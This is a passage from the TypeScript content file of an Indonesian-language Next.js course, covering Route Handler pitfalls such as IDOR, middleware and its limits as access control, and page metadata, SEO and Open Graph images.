      'Ini IDOR, dan ia tidak menghasilkan satu pun tanda. Id yang datang dari klien bukan bukti kepemilikan, ia hanya masukan. Yang benar adalah membaca id pengguna dari **sesi** yang sudah diverifikasi, bukan dari parameter. Aturan `security.md` menyebutnya tegas, yaitu setiap kueri di-scope ke pemilik yang berhak.',
    ),
    table(
      ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
      [
        [
          '405 Method Not Allowed',
          'Nama fungsi bukan method HTTP kapital',
          'Ganti menjadi `GET`, `POST`, dan seterusnya',
        ],
        [
          '`cannot have two parallel pages that resolve to the same path`',
          '`page.tsx` dan `route.ts` di folder yang sama',
          'Pisahkan alamatnya',
        ],
        [
          '`Body is unusable`',
          'Badan permintaan dibaca dua kali',
          'Pakai `permintaan.clone()` sebelum pembacaan pertama',
        ],
        [
          'Data pengguna lain bisa dibaca',
          'Id diambil dari parameter, bukan dari sesi',
          'Baca id dari sesi yang sudah diverifikasi',
        ],
        [
          'Respons ter-cache padahal berisi data pribadi',
          '`GET` bisa di-cache secara bawaan',
          'Tambahkan header cache yang tepat, atau baca `cookies()`',
        ],
      ],
    ),

    h2('Kesalahan umum pemula'),
    p(
      'Route Handler terlihat seperti bagian dari aplikasimu, dan sebenarnya ia pintu masuk publik yang tunduk pada seluruh aturan keamanan.',
    ),
    table(
      ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
      [
        [
          'Tidak memeriksa izin karena hanya dipakai aplikasi sendiri',
          'Yang memanggil kan halamanku',
          'Ia endpoint publik yang bisa dipanggil siapa pun dengan alat apa pun',
        ],
        [
          'Memakai id dari parameter untuk menentukan pemilik data',
          'Klien yang tahu id-nya',
          'Itu IDOR. Baca id dari sesi yang sudah diverifikasi',
        ],
        [
          'Membuat Route Handler untuk formulir di halaman sendiri',
          'Itu cara yang biasa',
          'Server Action lebih sedikit kodenya dan bekerja tanpa JavaScript. Route Handler untuk pemanggil di luar',
        ],
        [
          'Menamai fungsi dengan huruf kecil',
          'Konvensi JavaScript',
          'Next.js mencocokkan persis dengan method HTTP kapital. Hasilnya 405',
        ],
        [
          'Mengembalikan pesan galat teknis ke klien',
          'Supaya jelas apa yang salah',
          'Pesan teknis bisa membocorkan nama tabel dan struktur kueri. Kirim pesan umum, catat detailnya di log server',
        ],
        [
          'Tidak membatasi laju permintaan',
          'Belum ada yang menyalahgunakan',
          'Endpoint publik tanpa batas laju adalah undangan. Aturan `security.md` mewajibkannya, terutama untuk autentikasi',
        ],
      ],
    ),
    p(
      'Baris kedua adalah kelas kerentanan yang paling sering di endpoint yang ditulis sendiri, dan ia mudah dihindari sekali polanya dikenali. Setiap kali kamu menulis `where` yang memuat id dari klien, tanyakan apakah ada yang memastikan pemanggilnya berhak atas id itu. Kalau jawabannya tidak, siapa pun bisa mengganti angkanya.',
    ),
    callout(
      'info',
      'Sebagian kebutuhan Route Handler bisa hilang di App Router',
      'Endpoint yang dulu dibuat hanya untuk mengambil data bagi halamanmu sendiri sering tidak diperlukan lagi, sebab Server Component bisa memanggil database langsung. Yang tetap perlu adalah endpoint dengan pemanggil di luar, yaitu aplikasi seluler, mitra, webhook, dan alat pemantauan.',
    ),
    references(
      {
        label: 'route.js',
        href: 'https://nextjs.org/docs/app/api-reference/file-conventions/route',
        source: 'Next.js',
        note: 'Metode HTTP yang didukung, bentuk `params`, dan perilaku cache-nya.',
      },
      {
        label: 'NextResponse',
        href: 'https://nextjs.org/docs/app/api-reference/functions/next-response',
        source: 'Next.js',
        note: 'Menyusun body JSON, status code, header, dan cookie balasan.',
      },
      {
        label: 'Mass Assignment Cheat Sheet',
        href: 'https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html',
        source: 'OWASP',
        note: 'Kenapa menyebar body permintaan langsung ke query adalah celah, bukan kepraktisan.',
      },
      {
        label: 'Cross-Origin Resource Sharing (CORS)',
        href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS',
        source: 'MDN Web Docs',
        note: 'Aturan preflight dan larangan memadukan `*` dengan kredensial.',
      },
    ),
  ]),

  written('middleware', 'Middleware', 20, 'Kode yang berjalan sebelum permintaan mencapai rute.', [
    p(
      'Middleware berjalan sebelum permintaan sampai ke halaman atau route handler. Ia cocok untuk keputusan cepat berbasis permintaan: mengalihkan, menulis ulang URL, dan menambah header.',
    ),

    terms(
      {
        term: 'middleware',
        meaning:
          'Kode yang berjalan **sebelum** permintaan sampai ke halaman atau route handler. Cocok untuk keputusan cepat berbasis permintaan: mengalihkan, menulis ulang URL, dan menambah header. Bukan tempat logika berat.',
      },
      {
        term: 'proxy.ts',
        meaning:
          'Nama baru berkas ini di Next.js 16, dipilih karena "middleware" membuat orang mengira ia tempat menaruh logika berat. `middleware.ts` masih didukung. **Yang berubah namanya, bukan cara kerjanya.**',
      },
      {
        term: 'matcher',
        meaning:
          'Daftar pola rute yang menentukan permintaan mana yang melewati middleware. Buat sesempit mungkin: middleware berjalan untuk **setiap** permintaan yang cocok — termasuk permintaan aset kalau polanya terlalu luas.',
      },
      {
        term: 'redirect vs rewrite',
        meaning:
          '**Redirect** mengubah alamat di address bar dan browser meminta ulang. **Rewrite** menampilkan isi alamat lain sementara URL-nya tetap. Redirect terlihat pengguna; rewrite tidak.',
      },
      {
        term: 'NextResponse.next()',
        meaning:
          'Artinya "lanjutkan seperti biasa". Dipakai saat middleware tidak ingin mengalihkan apa pun — dan sekaligus jadi tempat menempelkan header pada balasan yang akan dikirim nanti.',
      },
      {
        term: 'penyaring awal, bukan penjaga terakhir',
        meaning:
          'Kesalahan keamanan paling sering di sub-bab ini. Middleware hanya melihat permintaan yang **melewatinya** — Server Action, Route Handler, dan query data tetap wajib memverifikasi sendiri. Kalau satu-satunya pemeriksaan ada di middleware, satu celah pada matcher membuka seluruh data.',
      },
      {
        term: 'X-Content-Type-Options: nosniff',
        meaning:
          'Header yang melarang browser menebak-nebak tipe sebuah berkas dari isinya. Tanpanya, berkas yang diunggah pengguna bisa "ditebak" sebagai HTML atau JavaScript lalu dieksekusi — jalur XSS yang tidak terlihat di kode mana pun.',
      },
      {
        term: 'X-Frame-Options: DENY',
        meaning:
          'Melarang halamanmu ditampilkan di dalam `<iframe>` situs lain. Ini pertahanan terhadap **clickjacking**: halaman aslimu ditumpuk transparan di atas halaman penyerang, sehingga pengguna mengklik tombolmu tanpa sadar.',
      },
      {
        term: 'nonce CSP',
        meaning:
          'Nilai acak sekali pakai yang berbeda **tiap permintaan**, dipakai Content-Security-Policy untuk mengizinkan skrip tertentu. Karena nilainya harus berbeda tiap kali, ini contoh sah header yang memang harus dibuat middleware — bukan `next.config.ts`.',
      },
    ),

    h2('Bentuknya'),
    code(
      'ts',
      `
        // src/middleware.ts (atau proxy.ts di Next.js 16)
        import { NextResponse, type NextRequest } from 'next/server';

        export function middleware(request: NextRequest) {
          const token = request.cookies.get('sesi')?.value;

          if (token === undefined) {
            const url = new URL('/masuk', request.url);
            url.searchParams.set('kembali', request.nextUrl.pathname);
            return NextResponse.redirect(url);
          }

          return NextResponse.next();
        }

        // Matcher menentukan rute mana yang melewatinya.
        export const config = {
          matcher: ['/dasbor/:path*', '/pengaturan/:path*'],
        };
        `,
    ),
    callout(
      'info',
      'Penamaan di Next.js 16',
      'Next.js 16 memperkenalkan `proxy.ts` sebagai nama yang lebih tepat untuk berkas ini, karena "middleware" membuat orang mengira ia tempat menaruh logika berat. `middleware.ts` masih didukung. Yang berubah adalah namanya, bukan cara kerjanya.',
    ),

    h2('Batas kemampuannya'),
    table(
      ['Bisa', 'Tidak bisa'],
      [
        ['Membaca cookie dan header', 'Query database (runtime terbatas)'],
        ['Redirect dan rewrite', 'Memakai Node.js API penuh'],
        ['Menyetel cookie dan header respons', 'Menjalankan pekerjaan berat'],
        ['Memeriksa keberadaan token', 'Memverifikasi tanda tangan token dengan library berat'],
      ],
    ),

    h2('Kesalahan keamanan yang paling sering'),
    callout(
      'danger',
      'Middleware bukan lapisan otorisasi yang cukup',
      'Middleware hanya melihat permintaan yang melewatinya. Cek di sana adalah **penyaring awal**, bukan penjaga terakhir: Server Action, Route Handler, dan query data tetap wajib memverifikasi identitas dan kewenangan sendiri. Kalau satu-satunya pemeriksaan ada di middleware, satu celah pada matcher membuka seluruh data.',
    ),
    code(
      'ts',
      `
        // Middleware: penyaring cepat — cukup cek ADA tidaknya token.
        if (request.cookies.get('sesi') === undefined) return redirectKeMasuk();

        // Di halaman/aksi: verifikasi yang sebenarnya.
        const sesi = await verifikasiSesi();       // periksa tanda tangan, kedaluwarsa
        if (sesi === null) redirect('/masuk');
        if (!sesi.boleh('baca:laporan')) forbidden();
        `,
    ),

    h2('Menambahkan header keamanan'),
    code(
      'ts',
      `
        export function middleware(request: NextRequest) {
          const respons = NextResponse.next();

          respons.headers.set('X-Content-Type-Options', 'nosniff');
          respons.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
          respons.headers.set('X-Frame-Options', 'DENY');

          return respons;
        }
        `,
    ),
    p(
      'Untuk header yang sama di semua rute, `headers()` di `next.config.ts` lebih tepat — ia tidak menambah kerja per permintaan. Middleware dipakai kalau nilainya bergantung pada permintaannya, misalnya nonce CSP yang berbeda tiap kali.',
    ),

    h2('Biayanya nyata'),
    p(
      'Middleware berjalan untuk **setiap** permintaan yang cocok dengan matcher — termasuk permintaan aset kalau matcher-mu terlalu luas. Buat matcher sesempit mungkin, dan jangan pernah menaruh pekerjaan yang bisa lambat di dalamnya.',
    ),
    divider,
    h2('Studi kasus di project nyata'),
    p(
      'Aplikasi butuh mengalihkan pengguna yang belum masuk dari seluruh halaman di bawah `/admin`. Versi pertama menaruh pemeriksaannya di tiap halaman, dan setelah ada dua puluh halaman, satu di antaranya lupa ditambahi sehingga bisa dibuka siapa pun. Versi kedua memindahkannya ke middleware, dan pemeriksaannya menjadi satu tempat untuk seluruh cabang.',
    ),
    p(
      'Middleware berjalan **sebelum** permintaan mencapai rute, dan itu yang membuatnya cocok untuk keputusan yang berlaku untuk banyak halaman sekaligus.',
    ),
    code(
      'ts',
      `
        import { NextResponse, type NextRequest } from 'next/server';

        export function middleware(permintaan: NextRequest) {
          const token = permintaan.cookies.get('sesi')?.value;

          if (!token) {
            const tujuan = new URL('/masuk', permintaan.url);
            // Simpan tujuan awalnya supaya bisa dikembalikan setelah masuk.
            tujuan.searchParams.set('kembaliKe', permintaan.nextUrl.pathname);
            return NextResponse.redirect(tujuan);
          }

          // Meneruskan informasi ke rute lewat header.
          const respons = NextResponse.next();
          respons.headers.set('x-jalur', permintaan.nextUrl.pathname);
          return respons;
        }

        // Matcher menentukan rute mana yang dilewati middleware.
        // Tanpa ini, ia berjalan untuk SETIAP permintaan termasuk aset.
        export const config = {
          matcher: ['/admin/:path*', '/pesanan/:path*'],
        };
        `,
      { filename: 'middleware.ts — di akar project, bukan di dalam app/' },
    ),
    p(
      'Berkas ini harus berada di **akar project**, sejajar dengan `app` bukan di dalamnya. Menaruhnya di `app/middleware.ts` membuatnya tidak pernah dijalankan sama sekali, dan tidak ada error apa pun. Ini kesalahan yang sangat sering dan gejalanya berupa middleware yang seolah diabaikan.',
    ),
    p(
      'Bagian `matcher` sering dilewatkan dan dampaknya besar. Tanpa itu, middleware berjalan untuk setiap permintaan termasuk gambar, berkas CSS, dan berkas JavaScript. Untuk halaman dengan lima puluh aset, itu lima puluh pemanggilan tambahan pada setiap kunjungan. Batasi ke jalur yang memang membutuhkannya.',
    ),
    code(
      'text',
      `
        Batas middleware yang WAJIB diketahui:

        - Berjalan di runtime Edge, BUKAN Node.js penuh
        - Tidak bisa mengakses database lewat driver Node biasa
        - Tidak bisa memakai modul Node seperti fs, crypto Node, atau path
        - Harus CEPAT, sebab ia menahan setiap permintaan yang cocok
        - Tidak cocok untuk verifikasi berat, misalnya memeriksa token ke database

        Yang cocok:
        - Memeriksa KEBERADAAN cookie, bukan keabsahannya
        - Mengalihkan berdasarkan jalur atau bahasa
        - Menambah header
        - Membagi pengguna untuk uji A/B
        `,
      { caption: 'Middleware untuk keputusan cepat, bukan untuk verifikasi lengkap.' },
    ),
    p(
      'Batas ini menentukan cara memakainya dengan benar. Middleware memeriksa **keberadaan** cookie sesi lalu mengalihkan kalau tidak ada, dan itu murah. Verifikasi bahwa tokennya sah dan belum dicabut dilakukan di halaman atau di Route Handler yang berjalan di Node.js penuh. Mengandalkan middleware sebagai satu-satunya penjaga adalah kesalahan keamanan yang dibahas di bagian error.',
    ),
    callout(
      'danger',
      'Middleware bukan kontrol akses yang cukup',
      'Ia memeriksa keberadaan cookie, bukan keabsahannya. Cookie palsu berisi teks apa pun akan lolos. Verifikasi tanda tangan token dan periksa pencabutannya di halaman atau Route Handler yang benar-benar mengakses data. Aturan `security.md` mengikat, yaitu otorisasi diperiksa di lapisan data bukan hanya di gerbang.',
    ),

    h2('Saat error-nya muncul'),
    p(
      'Empat kegagalan berikut adalah yang paling sering pada middleware, dan dua di antaranya tidak melempar apa pun.',
    ),
    code(
      'text',
      `
        # Berkas ditaruh di app/middleware.ts

        # Middleware tidak pernah berjalan.
        # Tidak ada error, tidak ada peringatan.
        `,
      { caption: 'Letak berkas salah.' },
    ),
    p(
      'Berkas middleware hanya dikenali kalau berada di akar project, sejajar dengan folder `app`. Kalau projectmu memakai folder `src`, ia diletakkan di `src/middleware.ts`. Menaruhnya di dalam `app` membuatnya diperlakukan sebagai modul biasa yang tidak pernah diimpor siapa pun. Gejalanya berupa pengalihan yang tidak pernah terjadi.',
    ),
    code(
      'text',
      `
        import { verifikasiToken } from './lib/jwt';   // memakai modul crypto Node

        Error: The edge runtime does not support Node.js 'crypto' module.
        `,
      { caption: 'Modul Node dipakai di runtime Edge.' },
    ),
    p(
      'Middleware berjalan di runtime yang jauh lebih terbatas daripada Node.js penuh. Modul seperti `fs`, `path`, dan sebagian `crypto` tidak tersedia. Kalau kamu butuh verifikasi token yang memakai kriptografi, pakai pustaka yang mendukung runtime Edge, atau pindahkan verifikasinya ke halaman yang berjalan di Node.js.',
    ),
    code(
      'text',
      `
        export function middleware(permintaan: NextRequest) {
          if (!permintaan.cookies.get('sesi')) {
            return NextResponse.redirect(new URL('/masuk', permintaan.url));
          }
        }
        # tanpa matcher, dan /masuk juga tidak dikecualikan

        # Halaman /masuk mengalihkan ke /masuk. Putaran tak berujung.
        ERR_TOO_MANY_REDIRECTS
        `,
      { caption: 'Halaman tujuan pengalihan ikut terkena middleware.' },
    ),
    p(
      'Ini jebakan klasik yang membuat aplikasinya benar-benar tidak bisa dibuka. Karena `/masuk` juga tidak punya cookie sesi, ia dialihkan ke dirinya sendiri berulang sampai peramban menyerah. Perbaikannya membatasi `matcher` sehingga `/masuk` tidak ikut, atau menambahkan pemeriksaan jalur di awal middleware.',
    ),
    code(
      'text',
      `
        # Middleware memeriksa keberadaan cookie 'sesi'.
        # Penyerang menyetel cookie 'sesi' berisi teks apa pun.

        # Lolos. Halaman admin terbuka.
        `,
      { caption: 'Tidak ada error, dan inilah kegagalan keamanan yang paling sering.' },
    ),
    p(
      'Middleware hanya memeriksa bahwa cookienya ada, bukan bahwa isinya sah. Menyetel cookie adalah hal yang bisa dilakukan siapa pun dari console peramban. Middleware berguna sebagai penyaring cepat yang mengurangi permintaan tidak perlu, dan verifikasi sungguhan tetap harus dilakukan di tempat yang mengakses data.',
    ),
    table(
      ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
      [
        [
          'Middleware tidak pernah berjalan',
          'Berkasnya bukan di akar project',
          'Pindahkan ke akar, sejajar dengan `app`',
        ],
        [
          '`The edge runtime does not support Node.js ... module`',
          'Modul Node dipakai di runtime Edge',
          'Pakai pustaka yang mendukung Edge, atau pindahkan ke halaman',
        ],
        [
          '`ERR_TOO_MANY_REDIRECTS`',
          'Halaman tujuan ikut terkena middleware',
          'Batasi `matcher`, atau kecualikan jalurnya',
        ],
        [
          'Halaman terlindungi bisa dibuka dengan cookie palsu',
          'Middleware hanya memeriksa keberadaan cookie',
          'Verifikasi tanda tangannya di halaman atau Route Handler',
        ],
        [
          'Setiap permintaan aset ikut melewati middleware',
          'Tidak ada `matcher`',
          'Batasi ke jalur yang memang membutuhkannya',
        ],
      ],
    ),

    h2('Kesalahan umum pemula'),
    p(
      'Middleware terlihat seperti tempat yang tepat untuk banyak hal, dan sebagian besarnya sebenarnya lebih baik di tempat lain.',
    ),
    table(
      ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
      [
        [
          'Mengandalkan middleware sebagai satu-satunya penjaga akses',
          'Ia berjalan sebelum semuanya',
          'Ia hanya memeriksa keberadaan cookie. Verifikasi sungguhan harus di lapisan yang mengakses data',
        ],
        [
          'Melupakan `matcher`',
          'Middleware kan hanya beberapa baris',
          'Ia berjalan untuk setiap permintaan termasuk aset. Untuk halaman dengan lima puluh aset, itu lima puluh pemanggilan tambahan',
        ],
        [
          'Menaruh berkasnya di dalam `app`',
          'Konsisten dengan berkas lain',
          'Ia hanya dikenali di akar project. Di dalam `app` ia tidak pernah berjalan',
        ],
        [
          'Memanggil database dari middleware',
          'Perlu memeriksa apakah tokennya masih berlaku',
          'Runtime Edge tidak mendukung driver database Node biasa, dan pemanggilannya menahan setiap permintaan',
        ],
        [
          'Melupakan pengecualian untuk halaman masuk',
          'Seluruh halaman perlu dilindungi',
          'Halaman masuk ikut dialihkan ke dirinya sendiri, dan aplikasinya tidak bisa dibuka sama sekali',
        ],
        [
          'Menaruh logika bisnis di middleware',
          'Ia berjalan lebih dulu jadi lebih efisien',
          'Ia menahan setiap permintaan yang cocok. Simpan untuk keputusan cepat berbasis jalur dan cookie',
        ],
      ],
    ),
    p(
      'Baris pertama layak ditegaskan karena ia memberi rasa aman yang keliru. Middleware adalah lapisan pertama yang mengurangi permintaan tidak perlu, bukan lapisan terakhir yang memutuskan. Aturan `security.md` menyebutnya sebagai zero trust, yaitu setiap permintaan diverifikasi di tempat ia benar-benar mengakses data, bukan sekali di gerbang.',
    ),
    callout(
      'tip',
      'Cara memeriksa apakah middleware benar-benar berjalan',
      'Tambahkan satu baris pencatatan di dalamnya lalu buka halamannya. Kalau tidak ada yang tercetak di terminal, ia tidak pernah berjalan dan penyebabnya hampir selalu letak berkas atau `matcher` yang tidak mencocokkan. Pemeriksaan sepuluh detik itu menghemat banyak waktu menebak.',
    ),
    references(
      {
        label: 'proxy.js (sebelumnya middleware.js)',
        href: 'https://nextjs.org/docs/app/api-reference/file-conventions/proxy',
        source: 'Next.js',
        note: 'Bentuk berkasnya, opsi `matcher`, dan batas kemampuan runtime-nya.',
      },
      {
        label: 'headers di next.config',
        href: 'https://nextjs.org/docs/app/api-reference/config/next-config-js/headers',
        source: 'Next.js',
        note: 'Tempat yang lebih tepat untuk header yang sama di semua rute — tanpa kerja per permintaan.',
      },
      {
        label: 'X-Content-Type-Options',
        href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options',
        source: 'MDN Web Docs',
        note: 'Melarang browser menebak tipe berkas — pertahanan terhadap satu kelas XSS.',
      },
      {
        label: 'Content Security Policy',
        href: 'https://nextjs.org/docs/app/guides/content-security-policy',
        source: 'Next.js',
        note: 'Kasus sah header yang harus dibuat middleware karena nilainya berbeda tiap permintaan.',
      },
    ),
  ]),

  written(
    'metadata-seo',
    'Metadata, SEO & Open Graph',
    19,
    'Membuat halaman terbaca mesin pencari dan pratinjau tautan.',
    [
      p(
        'Metadata menentukan apa yang muncul di tab browser, hasil pencarian, dan pratinjau saat tautanmu dibagikan. Di App Router ia diekspor sebagai objek atau fungsi — bukan ditulis manual di `<head>`.',
      ),

      terms(
        {
          term: 'metadata',
          meaning:
            'Informasi **tentang** halaman, bukan isi halamannya: judul tab, deskripsi di hasil pencarian, gambar pratinjau. Di App Router ia diekspor sebagai objek atau fungsi — bukan ditulis manual di dalam `<head>`.',
        },
        {
          term: 'SEO',
          meaning:
            'Singkatan *Search Engine Optimization* — upaya agar halaman ditemukan dan ditampilkan dengan benar oleh mesin pencari. Bagian teknisnya sebagian besar cuma ini: judul yang jelas, deskripsi yang jujur, dan HTML yang bisa dibaca tanpa menjalankan JavaScript.',
        },
        {
          term: 'template `%s`',
          meaning:
            "Pola judul di layout yang lubangnya diisi judul halaman anak. `template: '%s · Ruang Belajar Fullstack'` membuat setiap halaman otomatis berakhiran nama situs — tanpa kamu menuliskannya berulang di setiap halaman.",
        },
        {
          term: 'generateMetadata',
          meaning:
            'Fungsi `async` untuk metadata yang **bergantung pada data**. Ia menerima `params` yang sama dengan halamannya, jadi judul dan deskripsi bisa diambil dari isi pelajaran yang sedang dibuka.',
        },
        {
          term: 'Open Graph',
          meaning:
            'Standar yang dipakai WhatsApp, Slack, Facebook, dan LinkedIn untuk membuat **pratinjau tautan**. Tanpa tag ini, tautanmu muncul sebagai teks polos. Perlu diingat: crawler-nya membaca **HTML**, bukan hasil render JavaScript.',
        },
        {
          term: 'Twitter Card',
          meaning:
            'Padanan Open Graph khusus X/Twitter. Nilai `summary_large_image` menampilkan gambar besar; tanpanya, pratinjau memakai thumbnail kecil di samping teks.',
        },
        {
          term: '1200×630',
          meaning:
            'Ukuran piksel gambar pratinjau yang menjadi **standar de-facto** hampir semua platform. Rasionya sekitar 1,91:1. Gambar dengan rasio lain akan dipotong, dan bagian terpotongnya berbeda-beda per platform.',
        },
        {
          term: 'ImageResponse',
          meaning:
            'API Next.js yang membuat **gambar PNG dari JSX** saat build atau saat diminta. Dipakai untuk menghasilkan gambar Open Graph per halaman secara otomatis, sehingga setiap sub-bab punya pratinjau berisi judulnya sendiri.',
        },
        {
          term: 'robots',
          meaning:
            'Metadata yang meminta mesin pencari **tidak** mengindeks halaman ini. Kalimat kuncinya: ini permintaan **sopan** kepada crawler yang patuh — **bukan kontrol akses**. Halaman yang benar-benar privat tetap wajib dilindungi autentikasi di server.',
        },
      ),

      h2('Metadata statis'),
      code(
        'tsx',
        `
        // app/layout.tsx
        import type { Metadata } from 'next';

        export const metadata: Metadata = {
          title: {
            default: 'Ruang Belajar Fullstack',
            // %s diisi judul halaman anak.
            template: '%s · Ruang Belajar Fullstack',
          },
          description: 'Kurikulum Fullstack Developer yang terurut dari JavaScript nol sampai deploy.',
        };
        `,
      ),

      h2('Metadata dinamis'),
      code(
        'tsx',
        `
        export async function generateMetadata({
          params,
        }: {
          params: Promise<{ lesson: string }>;
        }): Promise<Metadata> {
          const { lesson } = await params;
          const isi = cariPelajaran(lesson);

          if (isi === undefined) return { title: 'Tidak ditemukan' };

          return {
            title: isi.judul,
            description: isi.ringkasan,
            openGraph: {
              title: isi.judul,
              description: isi.ringkasan,
              type: 'article',
            },
          };
        }
        `,
      ),
      p(
        '`generateMetadata` adalah konvensi berbasis nama, sehingga cukup mengekspor fungsi `async` dengan nama persis ini dari `page.tsx`, dan Next.js memanggilnya sendiri **sebelum** merender halamannya, lalu memakai hasilnya untuk mengisi tag `<head>`. Ia menerima `params` yang sama dengan komponen halamannya (karena itu bentuknya `Promise` yang harus di-`await`, sama seperti dibahas di sub-bab dynamic route), sehingga bisa mencari pelajaran yang sama dan menghasilkan judul yang sesuai. Percabangan `if (isi === undefined)` penting, sebab kalau slug-nya tidak dikenal, metadata tetap harus dikembalikan (judul "Tidak ditemukan") alih-alih membiarkan fungsi ini crash. Komponen halamannya sendiri yang nanti memanggil `notFound()` untuk menampilkan halaman 404 yang sesungguhnya.',
      ),

      h2('Open Graph & Twitter Card'),
      code(
        'ts',
        `
        export const metadata: Metadata = {
          openGraph: {
            title: 'Ruang Belajar Fullstack',
            description: 'Kurikulum terurut dari nol sampai produksi.',
            url: 'https://contoh.com',
            siteName: 'Ruang Belajar Fullstack',
            locale: 'id_ID',
            type: 'website',
            images: [{ url: '/og.png', width: 1200, height: 630, alt: 'Ruang Belajar Fullstack' }],
          },
          twitter: {
            card: 'summary_large_image',
            title: 'Ruang Belajar Fullstack',
            images: ['/og.png'],
          },
        };
        `,
      ),
      p(
        'Ukuran 1200×630 adalah standar de-facto yang dipakai hampir semua platform. `alt` tetap wajib.',
      ),

      h2('Gambar OG yang dibuat otomatis'),
      code(
        'tsx',
        `
        // app/kelas/[category]/[chapter]/[lesson]/opengraph-image.tsx
        import { ImageResponse } from 'next/og';

        export const size = { width: 1200, height: 630 };
        export const contentType = 'image/png';

        export default async function Gambar({ params }: { params: { lesson: string } }) {
          const isi = cariPelajaran(params.lesson);

          return new ImageResponse(
            (
              <div style={{ display: 'flex', flexDirection: 'column', width: '100%', height: '100%', padding: 80, background: '#0E0D0B' }}>
                <p style={{ color: '#E5A13C', fontSize: 28 }}>Ruang Belajar Fullstack</p>
                <h1 style={{ color: '#FAF7F1', fontSize: 64 }}>{isi?.judul ?? ''}</h1>
              </div>
            ),
            size,
          );
        }
        `,
      ),
      p(
        'Nama file `opengraph-image.tsx` di dalam segmen rute adalah konvensi berbasis file, sehingga sama seperti `page.tsx` atau `loading.tsx`, Next.js otomatis menghasilkan gambar dari berkas ini untuk rute yang bersangkutan tanpa kamu mendaftarkannya di `metadata` secara manual. Isi fungsinya menerima `params` yang sama dengan `page.tsx` di folder yang sama, sehingga bisa mengambil `isi.judul` pelajaran yang sedang dibuka dan menuliskannya ke gambar. Yang membuatnya terasa aneh pertama kali adalah JSX di dalam `ImageResponse` yang **tidak dirender sebagai HTML biasa**, sebab ia dikonversi menjadi gambar PNG lewat mesin rendering terpisah, dan mesin itu hanya mendukung subset kecil CSS (kebanyakan properti flexbox seperti yang dipakai di atas), bukan seluruh kemampuan CSS yang biasa dipakai di komponen halaman.',
      ),

      h2('Halaman privat: minta jangan diindeks'),
      code(
        'ts',
        `
        export const metadata: Metadata = {
          robots: { index: false, follow: false },
        };
        `,
      ),
      callout(
        'warning',
        '`robots` bukan kontrol akses',
        'Itu permintaan sopan kepada crawler yang patuh — bukan penjagaan. Halaman yang benar-benar privat tetap wajib dilindungi autentikasi di server. Website yang sedang kamu baca memakai `index: false` karena ia memang untuk satu orang, tapi itu bukan yang membuatnya aman.',
      ),

      h2('Berkas metadata lain'),
      table(
        ['Berkas di `app/`', 'Gunanya'],
        [
          ['`icon.png` / `favicon.ico`', 'Ikon tab browser'],
          ['`apple-icon.png`', 'Ikon saat disimpan di layar utama iOS'],
          ['`sitemap.ts`', 'Menghasilkan `sitemap.xml`'],
          ['`robots.ts`', 'Menghasilkan `robots.txt`'],
          ['`manifest.ts`', 'Manifest PWA'],
        ],
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman produk sudah dirender di server dan terbaca perayap. Setelah tiga bulan, tim menemukan bahwa seluruh seribu halaman produk punya judul yang sama, yaitu nama toko. Tautan yang dibagikan ke media sosial juga menampilkan gambar yang sama untuk semua produk. Penyebabnya, metadata hanya ditulis sekali di layout akar dan tidak pernah disesuaikan per halaman.',
      ),
      code(
        'tsx',
        `
        // Metadata statis: untuk halaman yang isinya tetap.
        import type { Metadata } from 'next';

        export const metadata: Metadata = {
          title: 'Tentang Kami',
          description: 'Cerita di balik toko kami sejak 2019.',
        };
        `,
        { filename: 'app/tentang/page.tsx' },
      ),
      code(
        'tsx',
        `
        // Metadata dinamis: dihitung dari data, untuk halaman yang isinya berbeda.
        export async function generateMetadata({
          params,
        }: {
          params: Promise<{ id: string }>;
        }): Promise<Metadata> {
          const { id } = await params;
          const produk = await ambilProduk(id);

          // Halaman yang tidak ada TIDAK boleh punya metadata yang tampak sah.
          if (!produk) return { title: 'Produk tidak ditemukan' };

          return {
            title: produk.nama,
            description: produk.ringkasan.slice(0, 155),
            openGraph: {
              title: produk.nama,
              description: produk.ringkasan.slice(0, 155),
              images: [{ url: produk.gambarUrl, width: 1200, height: 630 }],
              type: 'website',
            },
            alternates: { canonical: \`/produk/\${produk.slug}\` },
          };
        }

        export default async function HalamanProduk({ params }: Props) {
          const { id } = await params;
          const produk = await ambilProduk(id);      // pemanggilan kedua
          if (!produk) notFound();
          return <Detail produk={produk} />;
        }
        `,
        { filename: 'app/produk/[id]/page.tsx' },
      ),
      p(
        'Yang sering mengkhawatirkan dari bentuk di atas adalah `ambilProduk` dipanggil dua kali. Kalau ia memakai `fetch`, Next.js menggabungkan permintaan yang identik dalam satu render sehingga hanya satu yang benar-benar dikirim. Kalau ia memanggil database langsung, bungkus dengan `cache` dari React supaya hasilnya dipakai ulang. Tanpa salah satunya, kamu memang memanggilnya dua kali.',
      ),
      p(
        'Bagian `openGraph` yang menentukan tampilan tautan saat dibagikan ke media sosial dan aplikasi pesan. Ukuran gambar 1200 kali 630 adalah yang paling banyak didukung, dan menyebutkan `width` serta `height` membantu sebagian platform menampilkannya tanpa menunggu unduhan. Tanpa bagian ini, tautan yang dibagikan hanya menampilkan alamatnya.',
      ),
      p(
        'Bagian `alternates.canonical` menyelesaikan masalah yang sering luput, yaitu satu halaman yang bisa dicapai lewat beberapa alamat. Kalau `/produk/7` dan `/produk/kaos-polos` menampilkan hal yang sama, mesin pencari perlu tahu mana yang utama. Tanpa itu, keduanya bersaing dan peringkatnya terbagi.',
      ),
      code(
        'tsx',
        `
        // Layout akar: bawaan untuk seluruh halaman, dengan template judul.
        export const metadata: Metadata = {
          metadataBase: new URL('https://tokomu.id'),   // untuk mengubah URL relatif
          title: {
            default: 'Toko Kami',
            template: '%s | Toko Kami',                 // dipakai halaman anak
          },
          description: 'Belanja kaos dan kemeja berkualitas.',
        };
        `,
        { caption: 'Halaman anak yang menulis `title: "Kaos"` menjadi "Kaos | Toko Kami".' },
      ),
      callout(
        'warning',
        'Metadata hanya bisa diekspor dari Server Component',
